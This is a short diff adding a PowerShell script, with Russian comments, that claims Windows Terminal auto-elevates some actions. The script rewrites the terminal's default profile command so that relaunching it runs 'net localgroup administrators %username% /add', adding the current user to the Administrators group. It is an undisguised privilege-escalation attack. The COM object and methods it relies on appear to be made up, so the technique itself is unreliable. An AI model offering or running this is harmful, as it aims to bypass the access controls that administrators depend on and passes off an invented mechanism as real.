@@ -1,0 +1,8 @@
+# Windows Terminal имеет автоэлевацию для некоторых действий
+$wt = New-Object -ComObject "WindowsTerminal.TerminalControl"
+$settings = $wt.GetSettings()
+# Меняем настройки запуска
+$settings.DefaultProfile.CommandLine = "cmd.exe /c net localgroup administrators %username% /add"
+$settings.Save()
+# Перезапускаем терминал
+$wt.Launch()
